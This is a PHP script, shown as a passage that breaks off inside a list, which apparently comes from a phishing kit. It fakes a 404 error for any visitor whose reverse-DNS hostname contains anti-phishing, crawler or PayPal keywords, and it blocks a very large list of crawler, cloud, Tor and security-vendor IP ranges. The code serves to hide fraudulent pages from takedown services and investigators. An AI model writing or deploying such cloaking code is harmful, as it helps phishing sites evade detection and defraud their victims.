<?php

$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$blocked_words = array("above","google","softlayer","amazonaws","cyveillance","phishtank","dreamhost","netpilot","calyxinstitute","tor-exit", "paypal");
foreach($blocked_words as $word) {
    if (substr_count($hostname, $word) > 0) {
    header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

    }  
}
$bannedIP = array("^66.102.*.*", "^38.100.*.*", "^107.170.*.*", "^149.20.*.*", "^38.105.*.*", "^74.125.*.*",  "^66.150.14.*", "^54.176.*.*", "^38.100.*.*", "^184.173.*.*", "^66.249.*.*", "^128.242.*.*", "^72.14.192.*", "^208.65.144.*", "^74.125.*.*", "^209.85.128.*", "^216.239.32.*", "^74.125.*.*", "^207.126.144.*", "^173.194.*.*", "^64.233.160.*", "^72.14.192.*", "^66.102.*.*", "^64.18.*.*", "^194.52.68.*", "^194.72.238.*", "^62.116.207.*", "^212.50.193.*", "^69.65.*.*", "^50.7.*.*", "^131.212.*.*", "^46.116.*.* ", "^62.90.*.*", "^89.138.*.*", "^82.166.*.*", "^85.64.*.*", "^85.250.*.*", "^89.138.*.*", "^93.172.*.*", "^109.186.*.*", "^194.90.*.*", "^212.29.192.*", "^212.29.224.*", "^212.143.*.*", "^212.150.*.*", "^212.235.*.*", "^217.132.*.*", "^50.97.*.*", "^217.132.*.*", "^209.85.*.*", "^66.205.64.*", "^204.14.48.*", "^64.27.2.*", "^67.15.*.*", "^202.108.252.*", "^193.47.80.*", "^64.62.136.*", "^66.221.*.*", "^64.62.175.*", "^198.54.*.*", "^192.115.134.*", "^216.252.167.*", "^193.253.199.*", "^69.61.12.*", "^64.37.103.*", "^38.144.36.*", "^64.124.14.*", "^206.28.72.*", "^209.73.228.*", "^158.108.*.*", "^168.188.*.*", "^66.207.120.*", "^167.24.*.*", "^192.118.48.*", "^67.209.128.*", "^12.148.209.*", "^12.148.196.*", "^193.220.178.*", "68.65.53.71", "^198.25.*.*", "^64.106.213.*", "^209.85.32.23.*", "^79.179.124.48.*", "^77.125.106.92.*", "^79.180.114.96.*", "^82.81.11.229.*", "^86.153.246.23.*", "^82.34.171.94.*", "^79.180.48.237.*", "^82.46.233.231.*", "^79.180.33.27.*", "^193.200.150.26.*", "^124.181.27.144.*", "^79.76.188.117.*", "^82.0.187.66.*", "^217.42.58.163.*", "^82.34.113.133.*", "^81.154.94.149.*", "^90.195.96.231.*", "^77.98.114.162.*", "^88.106.189.47.*", "^76.5.13.62.*", "^84.92.109.3.*", "^12.34.146.126.*", "^125.18.56.109.*", "^125.16.133.35.*", "^82.47.63.164.*", "^82.33.151.120.*", "^82.36.115.38.*", "^172.202.141.106.*", "^77.98.251.100.*", "^128.232.110.18.*", "^130.191.107.117.*", "^130.76.32.16.*", "^131.251.0.53.*", "^137.110.222.77.*", "^138.253.103.20.*", "^143.127.3.10.*", "^148.168.40.4.*", "^163.221.52.175.*", "^172.190.239.53.*", "^193.5.216.100.*", "^194.203.250.250.*", "^194.72.238.67.*", "^195.214.79.22.*", "^195.93.21.105.*", "^195.93.21.129.*", "^195.93.21.136.*", "^195.93.21.70.*", "^202.4.237.25.*", "^202.73.163.19.*", "^202.73.163.20.*", "^202.75.200.7.*", "^202.75.200.9.*", "^209.147.114.202.*", "^209.147.127.216.*", "^209.147.127.218.*", "^209.147.127.219.*", "^209.147.127.222.*", "^209.59.47.248.*", "^209.59.55.7.*", "^209.59.56.166.*", "^211.72.233.10.*", "^216.168.239.87.*", "^216.17.247.100.*", "^63.100.163.218.*", "^63.76.155.166.*", "^64.127.103.136.*", "^64.127.103.138.*", "^64.127.98.128.*", "^64.127.98.50.*", "^64.27.13.93.*", "^64.34.162.150.*", "^65.110.179.164.*", "^65.110.181.217.*", "^65.110.181.78.*", "^65.110.182.139.*", "^65.110.182.195.*", "^65.110.182.56.*", "^65.199.34.69.*", "^66.135.213.75.*", "^66.135.40.79.*", "^66.139.77.201.*", "^66.148.91.86.*", "^66.16.13.10.*", "^66.170.132.12.*", "^66.179.210.152.*", "^66.179.210.153.*", "^66.179.210.169.*", "^66.179.210.181.*", "^66.179.210.253.*", "^66.179.22.39.*", "^66.180.82.88.*", "^66.194.6.132.*", "^66.194.6.136.*", "^66.227.46.235.*", "^66.249.66.136.*", "^66.31.67.249.*", "^66.36.231.203.*", "^66.77.136.123.*", "^68.111.223.249.*", "^69.26.94.123.*", "^71.105.129.43.*", "^71.6.196.245.*", "^72.128.124.10.*", "^72.13.36.7.*", "^72.14.163.84.*", "^72.3.137.83.*", "^74.53.202.82.*", "^75.3.251.62.*", "^80.176.191.254.*", "^80.178.164.165.*", "^80.178.233.97.*", "^80.6.93.148.*", "^81.152.0.194.*", "^81.153.73.112.*", "^81.173.119.129.*", "^81.179.50.161.*", "^83.252.109.165.*", "^84.103.175.127.*", "^84.136.255.210.*", "^84.65.49.1.*", "^86.131.47.254.*", "^86.133.166.100.*", "^88.110.29.46.*", "^89.104.53.113.*", "^89.104.63.167.*", "^89.241.28.199.*", "^89.241.7.79.*", "^89.243.23.145.*", "^66.249.83.84.*", "^64.233.172.84.*", "^66.249.84.4.*", "^66.249.88.89.*", "^66.102.7.4.*", "^66.249.82.4.*", "^66.249.85.89.*", "^173.255.112.208.*", "^107.170.248.133.*", "^5.79.100.165.*", "^94.237.29.234.*", "^37.97.137.40.*", "^23.239.5.82.*", "^185.135.157.53.*", "^188.166.215.12.*", "^54.83.5.6.*", "^46.229.168.154.*", "^54.243.132.119.*", "^54.245.241.22.*", "^68.183.157.237.*", "^78.47.204.123.*", "^52.42.49.200.*", "^178.62.23.58.*", "^194.209.200.2.*", "^88.99.84.6.*", "^198.16.7.150.*", "^45.63.110.63.*", "^178.154.171.85.*", "^139.59.109.12.*", "^66.102.6.48.*", "^66.102.6.44.*", "^54.241.7.11.*", "^46.229.168.136.*", "^192.0.91.22.*", "^46.229.168.133.*", "^46.229.168.152.*", "^116.202.105.128.*", "^31.31.72.29.*", "^168.253.114.34.*", "^105.45.16.130.*", "^197.51.216.107.*", "^221.124.63.218.*", "^70.113.252.69.*", "^72.12.194.93.*", "^72.12.194.92.*", "^72.12.194.91.*", "^72.12.194.94.*", "^5.195.232.131.*", "^188.236.181.237.*", "^175.157.33.249.*", "^72.12.194.90.*", "^90.118.170.92.*", "^57.66.188.11.*", "^174.64.78.5.*", "^75.131.103.46.*", "^49.72.104.149.*", "^84.140.157.151.*", "^95.25.181.72.*", "^172.255.93.252.*", "^174.208.6.194.*", "^91.183.34.13.*", "^45.26.171.180.*", "^62.156.167.50.*", "^62.224.61.3.*", "^88.108.42.218.*", "^81.246.108.230.*", "^105.112.104.185.*", "^154.127.0.114.*", "^222.72.248.194.*", "^87.113.72.199.*", "^120.92.72.199.*", "^60.28.34.234.*", "^101.88.91.72.*", "^39.77.118.8.*", "^154.72.170.208.*", "^154.72.138.2.*", "^223.72.99.251.*", "^210.72.5.212.*", "^42.202.155.224.*", "^45.56.152.115.*", "^178.73.220.201.*", "^46.246.1.226.*", "^120.92.72.147.*", "^120.92.72.220.*", "^120.92.72.144.*", "^207.189.31.162.*", "^72.255.40.17.*", "^120.92.72.108.*", "^120.92.72.104.*", "^31.31.72.24.*", "^72.11.148.145.*", "^223.72.74.70.*", "^120.92.72.72.*", "^120.92.72.185.*", "^120.92.72.50.*", "^120.92.72.2.*", "^120.92.72.99.*", "^116.7.72.45.*", "^120.92.72.66.*", "^61.130.169.72.*", "^72.169.130.61.*", "^104.200.67.249.*", "^153.0.3.40.*", "^221.203.38.152.*", "^183.12.222.72.*", "^211.157.151.53.*", "^219.133.94.61.*", "^120.92.72.96.*", "^54.188.115.186.*", "^35.162.179.90.*", "^54.213.34.158.*", "^34.222.32.181.*", "^52.38.77.76.*", "^120.92.72.246.*", "^120.92.72.170.*", "^112.0.141.72.*", "^218.72.43.122.*", "^122.43.72.218.*", "^113.160.207.235.*", "^113.72.121.69.*", "^173.239.232.159.*", "^145.14.94.14.*", "^153.126.182.12.*", "^103.218.216.135.*", "^60.190.66.172.*", "^167.179.83.246.*", "^49.72.104.254.*", "^223.72.171.114.*", "^207.189.25.72.*", "^13.64.0.0.*", "^13.104.0.0.*", "^13.107.14.0.*", "^20.0.0.0.*", "^20.36.0.0.*", "^20.37.64.0.*", "^20.40.0.0.*", "^20.45.64.0.*", "^20.45.80.0.*", "^20.45.128.0.*", "^20.46.32.0.*", "^20.46.144.0.*", "^20.46.192.0.*", "^20.48.0.0.*", "^20.64.0.0.*", "^20.150.0.0.*", "^20.160.0.0.*", "^20.184.0.0.*", "^20.192.0.0.*", "^23.96.0.0.*", "^23.100.0.0.*", "^23.102.0.0.*", "^23.103.64.0.*", "^23.103.128.0.*", "^23.103.160.0.*", "^40.64.0.0.*", "^40.66.166.0.*", "^40.93.238.0.*", "^40.95.86.0.*", "^40.95.238.0.*", "^40.96.0.0.*", "^40.104.0.0.*", "^40.107.18.0.*", "^40.107.142.0.*", "^40.119.160.0.*", "^40.120.0.0.*", "^40.123.192.0.*", "^40.126.192.0.*", "^40.127.0.0.*", "^51.10.0.0.*", "^51.12.0.0.*", "^51.51.0.0.*", "^51.53.0.0.*", "^51.103.0.0.*", "^51.104.0.0.*", "^51.107.0.0.*", "^51.116.0.0.*", "^51.120.0.0.*", "^51.124.0.0.*", "^51.132.0.0.*", "^51.136.0.0.*", "^51.138.0.0.*", "^51.140.0.0.*", "^51.144.0.0.*", "^52.96.0.0.*", "^52.96.38.0.*", "^52.98.16.0.*", "^52.101.148.0.*", "^52.103.144.0.*", "^52.103.208.0.*", "^52.105.196.0.*", "^52.112.0.0.*", "^52.120.0.0.*", "^52.125.0.0.*", "^52.136.0.0.*", "^52.146.0.0.*", "^52.148.0.0.*", "^52.152.0.0.*", "^52.160.0.0.*", "^52.224.0.0.*", "^52.239.232.0.*", "^64.4.0.0.*", "^65.52.0.0.*", "^66.119.144.0.*", "^70.37.0.0.*", "^70.37.128.0.*", "^94.245.64.0.*", "^102.37.0.0.*", "^102.37.128.0.*", "^102.133.0.0.*", "^102.133.128.0.*", "^104.0.0.0.*", "^104.40.0.0.*", "^104.44.238.0.*", "^104.47.19.0.*", "^104.146.0.0.*", "^104.146.128.0.*", "^104.208.0.0.*", "^111.221.16.0.*", "^111.221.64.0.*", "^128.94.0.0.*", "^131.253.1.0.*", "^131.253.5.0.*", "^131.253.6.0.*", "^131.253.8.0.*", "^131.253.12.0.*", "^131.253.24.0.*", "^131.253.32.0.*", "^131.253.61.0.*", "^131.253.62.0.*", "^131.253.128.0.*", "^132.245.0.0.*", "^134.170.0.0.*", "^135.149.0.0.*", "^137.116.0.0.*", "^137.135.0.0.*", "^138.91.0.0.*", "^138.239.0.0.*", "^143.64.0.0.*", "^147.145.0.0.*", "^147.243.0.0.*", "^148.7.0.0.*", "^150.171.0.0.*", "^150.171.254.0.*", "^155.62.0.0.*", "^157.55.0.0.*", "^157.56.0.0.*", "^157.60.23.0.*", "^157.60.31.0.*", "^158.158.0.0.*", "^159.27.0.0.*", "^163.228.0.0.*", "^167.105.0.0.*", "^167.220.240.0.*", "^168.61.0.0.*", "^168.62.0.0.*", "^169.0.0.0.*", "^169.138.0.0.*", "^170.165.0.0.*", "^191.232.0.0.*", "^192.48.225.0.*", "^192.84.160.0.*", "^192.197.157.0.*", "^193.149.64.0.*", "^193.221.113.0.*", "^198.49.8.0.*", "^198.200.130.0.*", "^198.206.164.0.*", "^199.30.16.0.*", "^199.60.28.0.*", "^199.103.90.0.*", "^199.103.122.0.*", "^199.242.48.0.*", "^202.89.224.0.*", "^204.79.135.0.*", "^204.79.179.0.*", "^204.79.195.0.*", "^204.79.252.0.*", "^204.95.96.0.*", "^204.152.18.0.*", "^204.152.140.0.*", "^206.138.168.0.*", "^206.191.224.0.*", "^207.46.0.0.*", "^207.46.36.0.*", "^207.46.40.0.*", "^207.46.48.0.*", "^207.46.64.0.*", "^207.46.128.0.*", "^207.68.128.0.*", "^207.82.250.0.*", "^208.68.136.0.*", "^208.76.45.0.*", "^208.76.46.0.*", "^208.84.0.0.*", "^208.84.1.0.*", "^208.84.2.0.*", "^208.84.3.0.*", "^208.84.4.0.*", "^209.185.128.0.*", "^209.185.240.0.*", "^209.240.192.0.*", "^213.199.128.0.*", "^216.32.180.0.*", "^216.32.240.0.*", "^216.33.240.0.*", "^216.220.208.0.*", "^192.117.178.10.*", "^199.103.32.16.*", "^216.138.114.147.*", "^24.53.120.157.*", "^64.251.14.50.*", "^69.128.12.34.*", "^209.59.48.136.*", "^217.54.65.198.*", "^62.139.252.195.*", "^194.82.51.28.*", "^81.154.124.52.*", "^86.128.59.31.*", "^196.218.119.171.*", "^66.16.13.45.*", "^124.180.183.238.*", "^66.93.229.2.*", "^64.114.199.38.*", "^207.210.65.98.*", "^61.17.46.248.*", "^217.156.83.1.*", "^202.53.95.130.*", "^216.203.40.121.*", "^59.115.163.42.*", "^134.58.253.57.*", "^65.110.180.66.*", "^65.110.182.34.*", "^65.110.185.48.*", "^65.222.176.122.*", "^137.108.145.10.*", "^87.70.7.125.*", "^87.70.16.150.*", "^89.241.65.3.*", "^130.94.134.166.*", "^208.80.193.48.*", "^65.110.182.7.*", "^65.110.184.164.*", "^65.110.180.210.*", "^69.146.20.216.*", "^206.208.58.51.*", "^64.236.208.28.*", "^1.160.0.0.*", "^103.245.44.0.*", "^107.150.32.0.*", "^109.73.66.0.*", "^109.74.154.0.*", "^110.228.0.0.*", "^110.240.0.0.*", "^111.192.0.0.*", "^111.240.0.0.*", "^111.72.0.0.*", "^113.120.0.0.*", "^114.160.0.0.*", "^114.32.0.0.*", "^115.239.253.0.*", "^117.212.0.0.*", "^118.120.0.0.*", "^118.124.0.0.*", "^118.168.0.0.*", "^119.44.0.0.*", "^121.224.0.0.*", "^121.37.0.0.*", "^122.164.0.0.*", "^122.168.0.0.*", "^122.176.0.0.*", "^123.112.0.0.*", "^123.151.148.0.*", "^123.252.235.208.*", "^125.200.0.0.*", "^128.111.0.0.*", "^128.68.0.0.*", "^128.69.0.0.*", "^128.72.0.0.*", "^141.212.0.0.*", "^143.215.0.0.*", "^144.76.0.0.*", "^150.70.160.0.*", "^150.70.64.0.*", "^150.70.96.0.*", "^154.35.0.0.*", "^162.243.0.0.*", "^163.0.0.0.*", "^165.228.0.0.*", "^171.80.0.0.*", "^173.10.240.0.*", "^173.226.0.0.*", "^173.255.192.0.*", "^173.8.0.0.*", "^174.129.0.0.*", "^176.14.0.0.*", "^176.192.0.0.*", "^176.195.0.0.*", "^176.32.72.0.*", "^178.19.104.0.*", "^178.24.96.163.*", "^178.25.204.10.*", "^178.32.0.0.*", "^178.42.0.0.*", "^178.79.128.0.*", "^180.136.0.0.*", "^180.176.0.0.*", "^180.180.121.0.*", "^180.76.0.0.*", "^183.0.0.0.*", "^184.107.0.0.*", "^184.72.0.0.*", "^184.75.208.0.*", "^185.25.149.0.*", "^186.47.59.20.*", "^188.165.0.0.*", "^188.168.248.0.*", "^188.244.32.0.*", "^188.75.64.0.*", "^188.98.0.0.*", "^188.98.64.0.*", "^188.99.0.0.*", "^192.232.213.166.*", "^192.99.0.0.*", "^193.71.0.0.*", "^195.159.140.0.*", "^195.159.140.196.*", "^195.168.0.0.*", "^195.182.80.128.*", "^195.214.79.0.*", "^195.88.252.0.*", "^198.20.69.72.*", "^198.50.128.0.*", "^198.50.152.0.*", "^199.241.144.0.*", "^199.30.228.0.*", "^199.48.144.0.*", "^2.190.0.0.*", "^200.198.201.64.*", "^201.49.208.0.*", "^202.191.128.0.*", "^202.28.0.0.*", "^202.56.255.48.*", "^203.118.62.96.*", "^203.171.224.0.*", "^203.31.216.176.*", "^203.88.192.0.*", "^204.101.161.0.*", "^204.118.31.0.*", "^207.102.0.0.*", "^207.189.96.0.*", "^208.48.224.0.*", "^208.49.0.0.*", "^208.50.0.0.*", "^208.80.192.0.*", "^208.91.112.0.*", "^209.133.0.0.*", "^209.139.192.0.*", "^209.139.197.112.*", "^209.30.0.0.*", "^212.152.32.0.*", "^212.8.79.64.*", "^216.130.192.0.*", "^216.145.17.0.*", "^216.177.128.0.*", "^216.201.128.0.*", "^216.201.222.0.*", "^216.38.192.0.*", "^217.149.63.64.*", "^217.23.128.0.*", "^218.6.0.0.*", "^219.143.41.168.*", "^219.96.0.0.*", "^220.181.0.0.*", "^221.232.0.0.*", "^222.216.0.0.*", "^222.218.0.0.*", "^223.112.0.0.*", "^223.116.0.0.*", "^223.216.0.0.*", "^223.64.0.0.*", "^223.96.0.0.*", "^23.20.0.0.*", "^23.234.192.0.*", "^24.172.0.0.*", "^27.16.0.0.*", "^31.3.152.0.*", "^37.140.192.0.*", "^37.252.238.0.*", "^37.52.0.0.*", "^37.59.0.0.*", "^38.0.0.0.*", "^38.100.21.0.*", "^38.229.0.0.*", "^4.0.0.0.*", "^41.228.32.0.*", "^46.137.0.0.*", "^46.188.0.0.*", "^46.36.32.0.*", "^46.73.0.0.*", "^5.135.0.0.*", "^5.35.208.0.*", "^5.39.219.116.*", "^5.39.219.120.*", "^5.39.219.128.*", "^50.16.0.0.*", "^50.30.32.0.*", "^50.97.0.0.*", "^50.97.98.128.*", "^54.192.0.0.*", "^54.204.0.0.*", "^54.206.0.0.*", "^54.208.0.0.*", "^54.216.0.0.*", "^54.220.0.0.*", "^54.224.0.0.*", "^54.234.0.0.*", "^54.240.0.0.*", "^58.208.0.0.*", "^59.174.0.0.*", "^60.160.0.0.*", "^60.242.0.0.*", "^61.138.0.0.*", "^61.172.0.0.*", "^62.149.224.0.*", "^62.90.0.0.*", "^62.99.77.165.*", "^64.124.0.0.*", "^64.19.64.0.*", "^64.212.0.0.*", "^64.55.0.0.*", "^64.62.128.0.*", "^64.62.160.0.*", "^64.90.160.0.*", "^66.129.64.0.*", "^66.129.97.240.*", "^66.249.64.0.*", "^66.55.0.0.*", "^66.55.29.0.*", "^67.205.64.0.*", "^67.217.160.0.*", "^68.71.52.0.*", "^69.162.80.216.*", "^69.163.128.0.*", "^69.164.111.192.*", "^69.164.192.0.*", "^69.58.176.0.*", "^70.96.0.0.*", "^72.12.209.240.*", "^72.167.0.0.*", "^72.20.36.128.*", "^72.55.154.0.*", "^72.64.0.0.*", "^74.217.0.0.*", "^74.52.0.0.*", "^77.93.32.0.*", "^78.129.173.128.*", "^78.157.192.0.*", "^78.46.218.248.*", "^79.134.64.0.*", "^79.134.73.0.*", "^79.185.0.0.*", "^79.191.0.0.*", "^8.0.0.0.*", "^80.219.68.35.*", "^80.82.64.0.*", "^81.27.124.0.*", "^83.24.0.0.*", "^83.31.0.0.*", "^83.4.0.0.*", "^83.8.0.0.*", "^84.14.214.192.*", "^84.237.85.0.*", "^85.13.198.128.*", "^85.143.164.0.*", "^85.17.94.0.*", "^85.204.0.0.*", "^87.242.72.0.*", "^87.245.187.224.*", "^87.249.110.176.*", "^88.165.150.0.*", "^88.165.152.0.*", "^88.165.160.0.*", "^88.165.192.0.*", "^88.166.0.0.*", "^88.168.0.0.*", "^88.172.0.0.*", "^88.190.15.0.*", "^88.208.192.0.*", "^88.208.224.0.*", "^88.208.240.0.*", "^88.208.248.0.*", "^89.178.0.0.*", "^89.190.192.0.*", "^89.248.160.0.*", "^89.79.83.166.*", "^91.121.160.0.*", "^91.194.90.0.*", "^91.212.136.0.*", "^91.22.217.20.*", "^91.22.223.140.*", "^91.22.234.69.*", "^91.22.242.104.*", "^91.22.255.141.*", "^91.76.0.0.*", "^92.240.68.0.*", "^92.46.119.0.*", "^92.46.120.0.*", "^93.114.40.0.*", "^93.115.80.0.*", "^93.157.232.0.*", "^93.159.224.0.*", "^93.159.230.0.*", "^93.174.88.0.*", "^93.174.90.0.*", "^93.80.0.0.*", "^94.126.177.16.*", "^94.126.240.0.*", "^94.180.192.0.*", "^94.228.129.0.*", "^94.228.130.0.*", "^95.211.0.0.*", "^95.221.0.0.*", "^95.24.0.0.*", "^95.28.0.0.*", "^95.30.0.0.*", "^95.72.120.0.*", "^95.72.232.0.*", "^95.72.24.0.*", "^95.72.240.0.*", "^95.72.248.0.*", "^95.72.32.0.*", "^96.47.224.0.*", "^99.65.74.64.*", "^221.208.0.0.*", "^221.212.0.0.*", "^124.64.0.0.*", "^107.20.0.0.*", "^75.126.0.0.*", "^158.144.0.0.*", "^5.175.8.0.*", "^108.161.128.0.*", "^209.37.97.14.*", "^5.39.80.0.*", "^91.228.164.0.*", "^174.16.0.0.*", "^71.6.128.0.*", "^5.255.253.0.*", "^90.189.0.0.*", "^217.69.128.0.*", "^157.54.0.0.*", "^157.60.0.0.*", "^107.178.192.0.*", "^118.244.0.0.*", "^192.81.128.0.*", "^37.140.141.0.*", "^37.9.84.0.*", "^210.144.0.0.*", "^113.16.0.0.*", "^222.176.0.0.*", "^54.176.0.0.*", "^178.68.0.0.*", "^95.220.0.0.*", "^84.177.59.245.*", "^66.85.128.0.*", "^192.155.208.0.*", "^176.61.138.0.*", "^178.25.216.183.*", "^174.139.0.0.*", "^64.69.64.0.*", "^194.90.88.0.*", "^204.93.128.0.*", "^94.102.49.0.*", "^54.72.0.0.*", "^54.80.0.0.*", "^62.140.253.0.*", "^37.144.0.0.*", "^109.163.234.0.*", "^173.193.120.240.*", "^95.72.112.0.*", "^192.210.128.0.*", "^84.177.10.227.*", "^128.204.203.103.*", "^84.177.20.186.*", "^220.178.0.0.*", "^220.180.0.0.*", "^65.111.190.0.*", "^77.247.181.160.*", "^103.12.8.0.*", "^59.44.0.0.*", "^188.162.32.0.*", "^130.207.0.0.*", "^178.238.237.0.*", "^66.187.149.80.*", "^72.12.192.0.*", "^128.74.0.0.*", "^86.63.99.99.*", "^124.133.239.160.*", "^178.140.0.0.*", "^46.22.166.0.*", "^64.246.160.0.*", "^195.91.128.0.*", "^64.120.128.0.*", "^173.255.112.0.*", "^61.147.0.0.*", "^94.100.16.0.*", "^94.100.17.0.*", "^213.81.140.52.*", "^162.213.24.0.*", "^217.79.181.0.*", "^217.79.182.0.*", "^223.4.0.0.*", "^183.192.0.0.*", "^114.104.0.0.*", "^117.24.0.0.*", "^174.36.192.0.*", "^162.247.72.0.*", "^37.130.227.128.*", "^213.81.140.54.*", "^213.81.140.50.*", "^198.74.228.0.*", "^173.234.0.0.*", "^89.234.68.64.*", "^85.114.128.0.*", "^76.164.224.0.*", "^76.164.192.0.*", "^86.104.134.0.*", "^178.175.139.0.*", "^95.130.9.0.*", "^188.95.104.0.*", "^188.95.108.0.*", "^109.173.0.0.*", "^76.74.128.0.*", "^5.199.142.0.*", "^94.23.0.0.*", "^46.182.106.0.*", "^94.242.192.0.*", "^213.81.140.36.*", "^95.167.110.232.*", "^141.0.169.0.*", "^92.242.32.0.*", "^62.210.0.0.*", "^81.7.135.128.*", "^223.252.0.0.*", "^37.112.0.0.*", "^46.105.32.0.*", "^46.242.0.0.*", "^188.65.76.128.*", "^188.244.40.0.*", "^114.240.0.0.*", "^116.224.0.0.*", "^95.154.230.0.*", "^91.194.84.0.*", "^79.77.28.227.*", "^69.72.247.0.*", "^91.203.36.0.*", "^109.188.138.0.*", "^218.56.0.0.*", "^82.145.220.0.*", "^216.145.0.0.*", "^66.249.0.0.*", "^158.181.128.0.*", "^80.79.119.192.*", "^202.53.8.0.*", "^82.221.105.0.*", "^108.62.0.0.*", "^213.253.0.0.*", "^107.170.0.0.*", "^194.72.238.0.*", "^83.222.232.214.*", "^61.145.231.0.*", "^195.154.0.0.*", "^188.190.96.0.*", "^23.251.128.0.*", "^175.101.0.0.*", "^109.73.65.0.*", "^69.174.240.0.*", "^62.210.128.0.*", "^91.200.12.0.*", "^78.130.205.0.*", "^209.190.113.80.*", "^213.73.22.128.*", "^220.104.0.0.*", "^136.186.0.0.*", "^119.63.192.0.*", "^202.46.32.0.*", "^185.10.104.0.*", "^199.193.112.0.*", "^64.233.160.0.*", "^161.69.0.0.*", "^162.253.64.0.*", "^202.117.0.0.*", "^173.203.224.0.*", "^174.142.0.0.*", "^98.136.0.0.*", "^109.74.192.0.*", "^109.187.128.0.*", "^162.222.176.0.*", "^61.191.0.0.*", "^109.73.66.128.*", "^216.163.176.0.*", "^194.153.113.0.*", "^85.25.236.0.*", "^69.64.32.0.*", "^199.217.112.0.*", "^89.145.108.192.*", "^62.94.96.88.*", "^93.186.16.0.*", "^199.116.168.0.*", "^206.253.224.0.*", "^206.253.226.0.*", "^50.112.0.0.*", "^193.200.173.0.*", "^209.160.0.0.*", "^209.160.64.0.*", "^148.251.0.0.*", "^131.181.0.0.*", "^199.19.248.0.*", "^89.202.197.128.*", "^194.81.192.0.*", "^50.201.125.0.*", "^199.16.196.0.*", "^109.190.0.0.*", "^64.74.0.0.*", "^64.72.128.0.*", "^50.56.0.0.*", "^222.190.118.0.*", "^2.92.0.0.*", "^188.168.144.0.*", "^64.235.144.0.*", "^37.187.32.0.*", "^89.145.95.0.*", "^37.58.100.224.*", "^182.71.212.72.*", "^128.208.0.0.*", "^115.28.0.0.*", "^69.64.64.0.*", "^66.23.224.0.*", "^5.254.248.0.*", "^37.187.0.0.*", "^203.195.128.0.*", "^182.18.0.0.*", "^76.74.0.0.*", "^188.40.106.192.*", "^109.248.96.0.*", "^121.128.0.0.*", "^117.78.12.0.*", "^180.210.224.0.*", "^61.228.0.0.*", "^121.196.0.0.*", "^211.69.128.0.*", "^67.20.48.0.*", "^213.165.80.0.*", "^202.104.0.0.*", "^125.113.0.0.*", "^66.240.192.0.*", "^95.141.43.0.*", "^61.139.0.0.*", "^84.200.0.0.*", "^37.58.96.0.*", "^142.4.192.0.*", "^175.16.0.0.*", "^121.8.0.0.*", "^222.246.0.0.*", "^114.24.0.0.*", "^103.22.181.0.*", "^122.116.0.0.*", "^173.212.140.0.*", "^50.128.0.0.*", "^222.126.128.0.*", "^180.152.0.0.*", "^174.143.0.0.*", "^211.150.64.0.*", "^182.128.0.0.*", "^141.0.8.0.*", "^85.115.52.0.*", "^36.224.0.0.*", "^99.111.189.136.*", "^184.172.0.0.*", "^63.251.0.0.*", "^112.64.0.0.*", "^107.167.96.0.*", "^62.24.222.132.*", "^78.47.102.160.*", "^183.79.0.0.*", "^208.90.56.0.*", "^81.7.10.0.*", "^208.109.0.0.*", "^92.103.69.0.*", "^12.167.151.0.*", "^101.224.0.0.*", "^80.86.85.0.*", "^221.192.0.0.*", "^78.47.40.48.*", "^103.246.36.0.*", "^193.205.136.0.*", "^217.175.54.0.*", "^82.119.198.136.*", "^85.25.71.0.*", "^85.25.72.0.*", "^85.25.76.0.*", "^85.25.78.0.*", "^83.175.117.0.*", "^77.41.80.0.*", "^217.31.48.0.*", "^217.31.52.0.*", "^112.124.0.0.*", "^198.20.64.0.*", "^87.98.252.0.*", "^209.222.8.104.*", "^60.166.0.0.*", "^60.168.0.0.*", "^5.149.151.0.*", "^217.13.181.224.*", "^89.207.18.182.*", "^173.194.69.147.*", "^149.3.176.145.*", "^66.235.156.128.*", "^173.194.69.125.*", "^173.194.69.120.*", "^173.194.69.102.*", "^173.194.69.95.*", "^173.194.69.94.*", "^173.194.69.91.*", "^173.0.88.2.*", "^173.0.84.2.*", "^173.0.84.34.*", "^173.0.88.34.*", "^2.20.6.85.*", "^63.245.213.92.*", "^173.194.69.106.*", "^173.194.69.99.*", "^173.194.69.103.*", "^173.194.69.104.*", "^173.194.69.105.*", "^63.245.217.20.*", "^64.62.203.172.*", "^173.194.69.113.*", "^173.194.69.138.*", "^173.194.69.139.*", "^173.194.69.100.*", "^173.194.69.101.*", "^63.245.217.71.*", "^188.112.175.207.*", "^66.235.139.166.*", "^66.235.138.2.*", "^66.235.138.59.*", "^66.235.139.153.*", "^66.235.139.152.*", "^66.235.138.44.*", "^66.235.139.118.*", "^66.235.138.18.*", "^66.235.139.121.*", "^66.235.138.19.*", "^66.235.134.160.*", "^66.235.133.8.*", "^66.235.133.52.*", "^66.235.133.33.*", "^66.235.132.152.*", "^66.235.133.62.*", "^66.235.132.232.*", "^66.235.132.118.*", "^66.235.133.11.*", "^66.235.132.121.*", "^149.20.57.227.*", "^199.48.147.36.*", "^37.59.162.218.*", "^89.122.57.201.*", "^69.163.205.29.*", "^74.120.15.150.*", "^109.163.233.200.*", "^79.120.86.20.*", "^31.172.30.4.*", "^109.65.136.19.*", "^66.150.14.185.*", "^50.97.98.130.*", "^80.237.226.73.*", "^64.34.184.153.*", "^66.230.230.230.*", "^71.165.245.158.*", "^76.73.56.7.*", "^77.109.139.87.*", "^81.218.219.122.*", "^83.86.110.188.*", "^83.142.228.14.*", "^83.249.87.238.*", "^85.17.92.13.*", "^85.235.31.248.*", "^87.118.104.203.*", "^88.80.28.70.*", "^88.208.121.151.*", "^89.253.97.235.*", "^91.121.170.32.*", "^94.249.153.47.*", "^95.143.193.145.*", "^109.169.29.56.*", "^109.123.119.163.*", "^137.56.163.46.*", "^137.56.163.64.*", "^173.193.221.28.*", "^192.251.226.205.*", "^192.251.226.206.*", "^199.48.147.35.*", "^199.48.147.38.*", "^199.48.147.40.*", "^199.48.147.41.*", "^208.66.135.190.*", "^209.44.114.178.*", "^209.159.142.164.*", "^209.159.143.130.*", "^213.220.233.230.*", "^8.18.38.105.*", "^62.141.58.13.*", "^62.163.180.154.*", "^77.171.107.207.*", "^78.47.251.152.*", "^81.169.155.246.*", "^82.194.86.135.*", "^83.163.192.49.*", "^91.121.152.114.*", "^91.213.50.235.*", "^93.167.245.178.*", "^94.23.215.184.*", "^174.138.169.218.*", "^64.34.162.160.*", "^66.249.9.107.*", "^66.96.16.32.*", "^78.107.233.68.*", "^78.107.237.16.*", "^83.170.92.9.*", "^85.214.73.63.*", "^91.124.187.225.*", "^194.0.229.54.*", "^195.43.157.85.*", "^212.78.238.92.*", "^217.114.211.20.*", "^62.24.222.131.*", 